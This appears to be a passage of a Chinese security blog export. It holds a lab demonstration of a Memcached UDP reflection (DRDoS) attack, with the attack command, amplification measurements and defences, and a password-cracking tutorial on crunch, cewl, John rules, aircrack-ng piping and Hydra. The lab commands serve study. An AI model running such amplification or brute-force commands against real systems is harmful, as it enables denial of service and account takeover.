<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c679b0ac5eb.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c679ca53f60.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c679ea45362.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c679fdcf777.png" /></p>
<h4 id="splunk系统测试">2.3 Splunk系统测试</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c67a2c57d66.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c67a44bd9f2.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c67a7d1488e.png" /></p>
<h4 id="防火墙测试">2.4防火墙测试</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c67a9c39831.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c67ac6867ae.png" /></p>
<h2 id="参考">参考</h2>
<p>[1].Snort_3.1.8.0_on_Ubuntu_18_and_20手册</p>
<p>[2]. <a
href="https://docs.splunk.com/Documentation/Splunk/8.2.6/Translated/SimplifiedChinesemanuals">Splunk简体中文版手册</a></p>
<p>[3]. <a
href="https://www.cnblogs.com/Deng-Xian-Sheng/p/14120221.html">Snort-IPS-入侵防御系统安装及部署小记</a></p>
<p>[4]. <a
href="https://blog.imkasen.com/ids-snort-practice.html">入侵检测系统（IDS）与
Snort 实践</a></p>
<p>[5]. <a
href="https://blog.51cto.com/u_12846753/4584529">C#使用SSH.NET编写一个Linux操作客户端</a></p>
<p>[6]. <a
href="https://baijiahao.baidu.com/s?id=1719715150349139622&amp;wfr=spider&amp;for=pc">Ubuntu
防火墙 Ufw 使用指南</a></p>
]]></content>
      <categories>
        <category>入侵检测</category>
      </categories>
      <tags>
        <tag>Snort</tag>
      </tags>
  </entry>
  <entry>
    <title>图灵可识别语言与图灵可判定语言的关系</title>
    <url>/2022/02/08/%E5%9B%BE%E7%81%B5%E5%8F%AF%E8%AF%86%E5%88%AB%E8%AF%AD%E8%A8%80%E4%B8%8E%E5%9B%BE%E7%81%B5%E5%8F%AF%E5%88%A4%E5%AE%9A%E8%AF%AD%E8%A8%80%E7%9A%84%E5%85%B3%E7%B3%BB/</url>
    <content><![CDATA[<p><strong>1、可识别的定义：</strong>
存在图灵机，对语言中每个字符串，该图灵机均接受。对语言外的每个字符串，该图灵机拒绝或不停机。
<strong>2、可判定的定义：</strong>
存在图灵机，对语言中每个字符串，该图灵机均接受。对语言外的每个字符串，该图灵机拒绝。
<strong>　　显然判定一个语言的图灵机也是识别该语言的图灵机。也就是说可判定推出可识别。</strong>
<strong>　　换句话说，可判定的条件比可识别的要强。实际上，一个语言可判定当且仅当它和它的补都是可识别的。</strong>
<strong>注意:</strong>
图灵可识别语言和图灵可判定语言的区别：若S是图灵可识别语言，则只需存在一台图灵机M，当M的输入W∈S时，M一定会停机并进入接受状态；当M的输入W∉S时，M可能停机并进入拒绝状态，或者永不停机。而若S是图灵可判定语言，则必须存在图灵机M，使得对于任意输入串W∈∑∗，M总能停机，并根据Ω属于或不属于S分别进入接受或拒绝状态。并不是所有的语言都是图灵可识别的，可以证明存在图灵不可识别语言。</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>图灵机</tag>
      </tags>
  </entry>
  <entry>
    <title>基于Memcached的DRDOS攻击演示</title>
    <url>/2022/05/03/%E5%9F%BA%E4%BA%8Ememcached%E7%9A%84drdos%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA/</url>
    <content><![CDATA[<p> </p>
<h2 id="原理">1. 原理</h2>
<h3 id="drdos">1.DRDOS</h3>
<p>DRDoS中文意思是“分布式反射拒绝服务”。与DoS、DDoS不同，该方式靠的是发送大量带有被害者IP地址的数据包给攻击主机，然后攻击主机对IP地址源做出大量回应，形成拒绝服务攻击。往往选择那些响应包远大于请求包的服务来利用，这样才可以以较小的流量换取更大的流量，获得几倍甚至几十倍的放大效果。一般来说，可以被利用来做放大反射攻击的服务包括DNS服务、NTP服务、SSDP服务、Chargen服务、Memcached等。</p>
<h3 id="memcached">2.Memcached</h3>
<p>Memcached
是一个高性能的分布式内存对象缓存系统，用于动态Web应用以减轻数据库负载。它通过在内存中缓存数据和对象来减少读取数据库的次数，从而提高动态、数据库驱动网站的速度。</p>
<h3 id="攻击原理">3.攻击原理</h3>
<p>Memcached 本身没有权限控制模块，所以对公网开放的 Memcached
服务很容易被攻击者扫描发现。该类攻击主要使用 Memcached 协议的 UDP
端口开展攻击，攻击者通过向开启了 UDP 协议支持的 Memcached
服务器上发送伪造的 IP 欺骗请求，Memcached
服务器会将大量的响应报文发往目标攻击主机，从而占用目标攻击机器的大量带宽资源，导致拒绝服务。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/05/img_6270a1fa237c4.png" /></p>
<h2 id="攻击演示">2. 攻击演示</h2>
<h3 id="实验环境">1.实验环境</h3>
<p>Victim：Kali 2019(10.10.10.187) Attacker：Kali 2021(10.10.10.135)
由于个人电脑性能受限Memcached服务器也由Kali
2021(10.10.10.135)充当，另外需要memcached开启UDP服务</p>
<h3 id="环境部署">2.环境部署</h3>
<p>Kali 2021安装memcached服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install memcached</span><br></pre></td></tr></table></figure>
<p>报错</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">E: Unable to locate package memcached</span><br><span class="line">或者提示一系列依赖包的版本不符（不建议重新安装相关依赖包，一是包的数量较多，另外卸载原包重安装时可能导致系统崩溃）</span><br></pre></td></tr></table></figure>
<p>修改更新源</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim  /etc/apt/sources.list</span><br><span class="line"><span class="comment">#中科大</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>
<p>更新</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade</span><br><span class="line">apt-get clean <span class="comment">#删除以下载的包</span></span><br><span class="line">reboot <span class="comment">#重新启动</span></span><br></pre></td></tr></table></figure>
<h3 id="环境测试">3.环境测试</h3>
<p><strong>启动memcached服务，memcached服务默认端口是11211</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">memcached -p 11211 -m 64m -vv -u memcache -U 11211</span><br></pre></td></tr></table></figure>
<p>注意，Memcached 新版本已经默认禁用 UDP
服务，所以实验时需要手动启用（-U 11211）</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/05/img_6270a20ceccd2.png" /></p>
<p>在kali 2019上使用下面命令测试是否对外开放了Memcached 11211
UDP端口，若返回内容非空，则表明对外开放了Memcached 11211
UDP端口的Memcached服务。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -en <span class="string">&quot;\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n&quot;</span>  nc -u 10.10.10.135 11211</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/05/img_6270a21ad89bc.png" /></p>
<p>Wireshark抓包查看放大效果</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/05/img_6270a22582fca.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/05/img_6270a22c4ada4.png" /></p>
<p>放大了40倍
我们也可以事先往Memcached中写入一定的数据，再对目标进行反射，这样可以达到更好的效果，操作如下</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/05/img_6270a23921dfb.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/05/img_6270a23e81067.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/05/img_6270a243cff53.png" /></p>
<p>放大了951倍</p>
<h3 id="实操攻击">4.实操攻击</h3>
<p><strong>Attacker利用 <a
href="https://github.com/Srar/MemcacheDos">脚本</a> 攻击</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./node_modules/.bin/ts-node main.ts --list result.txt --ip 10.10.10.187 --port 80</span><br><span class="line">参数说明：</span><br><span class="line">--list [memcache server list file] --ip [target ip] --port [target port]</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/05/img_6270a24d7b6c0.png" /></p>
<p><strong>备注：ctrl+c停止攻击 攻击时的出网带宽</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vnstat -i eth0 -l</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/05/img_6270a25d8315b.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/05/img_6270a264792dd.png" /></p>
<p>可见出网带宽达到了27Mbit/s。 查看攻击时的端口流量</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iftop -i eth0 -P</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/05/img_6270a27e3afdf.png" /></p>
<p> 我们可以使用上面两命令评判Memcache 是否受到了攻击
Attacker端抓包结果（攻击前打开）</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/05/img_6270a28cd236d.png" /></p>
<p>Victim端抓包</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/05/img_6270a294857d8.png" /></p>
<p>与ntp drdos，ssdp drdos等相比，memcached
drdos的反射效果更佳，甚至可放大上万倍。</p>
<h2 id="memcached攻击防御">3. Memcached攻击防御</h2>
<h4
id="定期升级使用官方最新版本memcached">1.定期升级，使用官方最新版本Memcached</h4>
<h4 id="配置访问控制">2.配置访问控制</h4>
<p>建议用户不要将服务发布到互联网上而被黑客利用，可以通过ECS安全组规则或iptables配置访问控制规则。
例如，在Linux环境中运行命令iptables -A INPUT -p tcp -s 192.168.0.2
—dport 11211 -j
ACCEPT，在iptables中添加此规则只允许192.168.0.2这个IP对11211端口进行访问。</p>
<h4 id="绑定监听ip">3.绑定监听IP</h4>
<p>如果Memcached没有在公网开放的必要，可在Memcached启动时指定绑定的IP地址为
127.0.0.1。例如，在Linux环境中运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid</span><br></pre></td></tr></table></figure>
<h4
id="使用最小化权限账号运行memcached服务">4.使用最小化权限账号运行Memcached服务</h4>
<p>使用普通权限账号运行，指定Memcached用户。例如，在Linux环境中运行以下命令来运行Memcached：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid</span><br></pre></td></tr></table></figure>
<h4 id="启用认证功能">5.启用认证功能</h4>
<p>Memcached本身没有做验证访问模块,Memcached从1.4.3版本开始，能支持SASL认证。</p>
<h4 id="修改默认端口">6.修改默认端口</h4>
<p>修改默认11211监听端口为11222端口。在Linux环境中运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P /tmp/memcached.pid</span><br></pre></td></tr></table></figure>
<h4 id="备份数据">7.备份数据</h4>
<p>为避免数丢失，升级前请做好备份，或者建立ECS硬盘快照。</p>
<h4
id="利用第三方安全防护系统如阿里云盾">8.利用第三方安全防护系统，如阿里云盾</h4>
<h2 id="参考资料">4. 参考资料</h2>
<p>[1].<a
href="https://developer.aliyun.com/article/503688">https://developer.aliyun.com/article/503688</a></p>
<p>[2].<a
href="https://www.freebuf.com/column/164095.html">https://www.freebuf.com/column/164095.html</a></p>
<p>[3].<a
href="https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/?spm=a2c6h.12873639.article-detail.5.2cdc6bcc4jAiic">https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/?spm=a2c6h.12873639.article-detail.5.2cdc6bcc4jAiic</a></p>
<p>[4].<a
href="https://help.aliyun.com/document_detail/37553.html?spm=a2c6h.12873639.article-detail.4.2cdc6bcc3NaI4q">https://help.aliyun.com/document_detail/37553.html?spm=a2c6h.12873639.article-detail.4.2cdc6bcc3NaI4q</a></p>
<p>[5].<a
href="https://shockerli.net/post/memcached-udp-reflection-attack-bug/">https://shockerli.net/post/memcached-udp-reflection-attack-bug/</a></p>
<p>[6].<a
href="https://github.com/Srar/MemcacheDos">https://github.com/Srar/MemcacheDos</a></p>
<p>[7].<a
href="https://www.runoob.com/memcached/memcached-tutorial.html">https://www.runoob.com/memcached/memcached-tutorial.html</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>DRDOS</tag>
      </tags>
  </entry>
  <entry>
    <title>密码破解</title>
    <url>/2022/08/17/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="密码破解方法">1. 密码破解方法</h2>
<ul>
<li><strong>人工猜解</strong></li>
<li><strong>垃圾桶工程</strong></li>
<li><strong>被动信息收集</strong></li>
<li><strong>基于字典暴力破解(主流)</strong></li>
<li><strong>键盘空间字符暴破</strong></li>
<li><strong>字典</strong></li>
<li><strong>用户密码变型</strong></li>
<li><strong>基于cewl的结果进行密码变型</strong></li>
<li><strong>末尾增加数字串</strong></li>
<li><strong>字母大小写变化</strong></li>
<li><strong>字母与符号互相转换</strong></li>
<li><strong>字母与数字互相转换</strong></li>
<li><strong>P@$$w02d【password】</strong></li>
<li><strong>保存有用户名和密码的文本文件位置</strong></li>
<li><strong>/usr/share/wordlist</strong></li>
<li><strong>/usr/share/wfuzz/wordlist</strong></li>
<li><strong>/usr/share/seclists【seclists含有渗透测试可以用到的各种字典，但是有些Kali
Linux版本默认并没有安装该字典，可自行安装】</strong></li>
</ul>
<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817111803929-915088027.png" /></strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817112057967-219834813.png" /></p>
<h2 id="字典生成">2. 字典生成</h2>
<h3 id="键盘空间字符爆破">1、键盘空间字符爆破</h3>
<ul>
<li><strong>全键盘空间字符</strong></li>
<li><strong>部分键盘空间字符(基于规则)</strong></li>
<li><strong>数字、小写字母、大写字母、符号、空格、瑞典字符、高位ASCII码</strong></li>
</ul>
<h3 id="crunch-介绍通用">2、crunch 介绍【通用】</h3>
<h4 id="基本格式">（1）基本格式</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch &lt;min-len&gt; &lt; max-len&gt; [ &lt;charset string&gt;] [options]</span><br></pre></td></tr></table></figure>
<p><strong>注， <charset string> 默认是小写字符</strong></p>
<h4 id="示例">（2）示例</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 6 6  1234567890 -o START -d 2 -b 1mb / -c 100</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>-b 按大小分割字典文件 (kb/kib、 mb/mib、 gb/gib
)</strong></li>
<li><strong>-c 每个字典的行数</strong></li>
<li><strong>以上两个参数必须与-o START结合使用</strong></li>
<li><strong>-d 同一字符连贯出现数量(11/aa)</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817113830579-2057969004.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817113919410-547934738.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817115456704-403593465.png" /></p>
<h4 id="字符集-charset.lst-自带">（3）字符集
<strong>charset.lst</strong> 【自带】</h4>
<p>官方提供了可能的字符集组合【见下图】</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817115640575-558707801.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 4 4 -f /usr/share/crunch/charset.lst lalpha-sv -o test.txt</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817115835458-255699690.png" /></p>
<h4 id="参数-p无重复字符">（4）参数：-p【无重复字符】</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 1 1 -p 01234 | more</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>对 -p
指定的单个字符串【以每个字符为基本单位】或多个字符串【以每个字符串为基本单位】进行排列【该顺序】</strong></li>
<li><strong>必须是最后个参数</strong></li>
<li><strong>此时最大、最小字符长度失效，但必须存在</strong></li>
<li><strong>与-S参数不兼容( -S指定起始字符串)</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817140516261-1264093592.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817144614445-264471305.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 4 4 0123456789 -s 9900</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817141126077-1120943917.png" /></p>
<h4 id="参数-q">（5）参数：-q</h4>
<p>读取文件中每行内容作为基本字符生成字典</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 1 1 -q 1.txt </span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817141503689-304147484.png" /></p>
<h4 id="参数-t指定字典组成规则">（6）参数：-t【指定字典组成规则】</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 6 6 -t @,%%^^ | more</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>-t 相当于指定掩码</strong></li>
<li><strong>@ ：小写字母 lalpha</strong></li>
<li><strong>,：大写字母 ualpha</strong></li>
<li><strong>%：数字 numeric</strong></li>
<li><strong>^ ：符号【特殊字符，如![ &amp;%$@】 symbols</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817142437340-1342009731.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817142834212-1811182435.png" /></p>
<h4 id="参数-z输出文件压缩">（7）参数：-z【输出文件压缩】</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 4 4 -t @,%^ -o <span class="built_in">test</span> -z 7z</span><br></pre></td></tr></table></figure>
<ul>
<li>其他压缩格式：gzip、bzip2、lzma</li>
<li>7z压缩比率最大</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817143435760-1254206411.png" /></p>
<h4 id="综合示例">（8）综合示例</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space -o w.txt -t @d@@ -s cdab</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817144259309-1522827353.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817144128153-2093734673.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 5 5 abc DEF + \!@<span class="comment"># -t ,@^%,</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>+ 占位符</strong></li>
<li><strong> 转义符【空格、符号】，双斜杠可将  包含进去</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817144935075-1543910669.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 5 5 -t ddd%% -p dog <span class="built_in">cat</span> bird</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>任何不同于-p参数指定的值都是占位符</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817145654522-540299160.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 5 5 -d 2@ -t @@@%%  </span><br></pre></td></tr></table></figure>
<ul>
<li><strong>-d 2@ 排除aaa …,bbb…,……</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817145935302-899794205.png" /></p>
<h4 id="组合应用">（9）组合应用</h4>
<p><strong>边生成字典，便破解WiFi【避免生成大量的字典占用磁盘空间，但破解显然用时更长】</strong></p>
<p><strong>示例1</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 2 4 0123456789 | aircrack ng a.cap -e MyESSID -w -</span><br></pre></td></tr></table></figure>
<p><strong>示例2</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crunch 10 10 12345 --stdout airolib-ng testdb -import passwd -</span><br></pre></td></tr></table></figure>
<h3 id="cupp-介绍个人信息专属字典">3、CUPP 介绍【个人信息专属字典】</h3>
<p>按照个人信息 <strong>生成专属密码字典，具体参见：<a
href="https://www.cnblogs.com/z9m8r8/articles/15568887.html"
class="uri">https://www.cnblogs.com/z9m8r8/articles/15568887.html</a></strong></p>
<h3 id="cewl-介绍网站">4、cewl 介绍【网站】</h3>
<p>通过收集网站信息生成字典</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl www.baidu.com -m 3 -d 3 -e -c -v -w 2.txt</span><br></pre></td></tr></table></figure>
<ul>
<li>-m：最小单词长度</li>
<li>-d：爬网深度</li>
<li>-e：收集包含email地址信息</li>
<li>-c：每个单词出现次数</li>
<li>-v：显示详细信息</li>
<li>支持基本、摘要身份认证</li>
<li>支持代理</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820170801385-335167872.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820170850333-1876927139.png" /></p>
<h3 id="johnjtr基于自定义规则">5、John/JTR【基于自定义规则】</h3>
<p>使用John the Ripper配置文件实现密码动态变型，
<strong>配置文件：/etc/john/john.conf</strong></p>
<h4
id="在默认的list.ruleswordlist-后自定义规则">（1）在默认的[List.Rules:Wordlist]
后自定义规则</h4>
<p>示例：<span class="math inline">\([0-9]\)</span>[a-z]$[0-9]</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820174006541-176023727.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john --wordlist=pass.list --rules  --stdout &gt; m.txt</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820174156409-378754844.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820174257304-981650712.png" /></p>
<h4 id="新建自己的规则集">（2）新建自己的规则集</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[List.Rules:<span class="built_in">test</span>]</span><br><span class="line">$[0-3]$[a-e]$[0-5]</span><br><span class="line">$[a-z]$[~!@<span class="comment">#$%^ &amp;*()\- =+]</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820174743298-1708736194.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john --wordlist=pass.list --rules=<span class="built_in">test</span>  --stdout &gt; m.txt</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820175036731-1745670775.png" /></p>
<h2 id="在线密码破解">3. 在线密码破解</h2>
<h3 id="hydra-介绍">1、hydra 介绍</h3>
<ul>
<li><strong>Help</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -R        restore a previous aborted/crashed session</span><br><span class="line">  -I        ignore an existing restore file (don<span class="string">&#x27;t wait 10 seconds)</span></span><br><span class="line"><span class="string">  -S        perform an SSL connect</span></span><br><span class="line"><span class="string">  -s PORT   if the service is on a different default port, define it here</span></span><br><span class="line"><span class="string">  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE</span></span><br><span class="line"><span class="string">  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE</span></span><br><span class="line"><span class="string">  -x MIN:MAX:CHARSET  password bruteforce generation, type &quot;-x -h&quot; to get help</span></span><br><span class="line"><span class="string">  -y        disable use of symbols in bruteforce, see above</span></span><br><span class="line"><span class="string">  -r        use a non-random shuffling method for option -x</span></span><br><span class="line"><span class="string">  -e nsr    try &quot;n&quot; null password, &quot;s&quot; login as pass and/or &quot;r&quot; reversed login</span></span><br><span class="line"><span class="string">  -u        loop around users, not passwords (effective! implied with -x)</span></span><br><span class="line"><span class="string">  -C FILE   colon separated &quot;login:pass&quot; format, instead of -L/-P options</span></span><br><span class="line"><span class="string">  -M FILE   list of servers to attack, one entry per line, &#x27;</span>:<span class="string">&#x27; to specify port</span></span><br><span class="line"><span class="string">  -o FILE   write found login/password pairs to FILE instead of stdout</span></span><br><span class="line"><span class="string">  -b FORMAT specify the format for the -o FILE: text(default), json, jsonv1</span></span><br><span class="line"><span class="string">  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)</span></span><br><span class="line"><span class="string">  -t TASKS  run TASKS number of connects in parallel per target (default: 16)</span></span><br><span class="line"><span class="string">  -T TASKS  run TASKS connects in parallel overall (for -M, default: 64)</span></span><br><span class="line"><span class="string">  -w / -W TIME  wait time for a response (32) / between connects per thread (0)</span></span><br><span class="line"><span class="string">  -c TIME   wait time per login attempt over all threads (enforces -t 1)</span></span><br><span class="line"><span class="string">  -4 / -6   use IPv4 (default) / IPv6 addresses (put always in [] also in -M)</span></span><br><span class="line"><span class="string">  -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode </span></span><br><span class="line"><span class="string">  -O        use old SSL v2 and v3</span></span><br><span class="line"><span class="string">  -K        do not redo failed attempts (good for -M mass scanning)</span></span><br><span class="line"><span class="string">  -q        do not print messages about connection errors</span></span><br><span class="line"><span class="string">  -U        service module usage details</span></span><br><span class="line"><span class="string">  -m OPT    options specific for a module, see -U output for information</span></span><br><span class="line"><span class="string">  -h        more command line options (COMPLETE HELP)</span></span><br><span class="line"><span class="string">  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)</span></span><br><span class="line"><span class="string">  service   the service to crack (see below for supported protocols)</span></span><br><span class="line"><span class="string">  OPT       some service modules support additional input (-U for module help)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Supported services: adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-&#123;head|get|post&#125; http[s]-&#123;get|post&#125;-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-&#123;cram|digest&#125;md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs 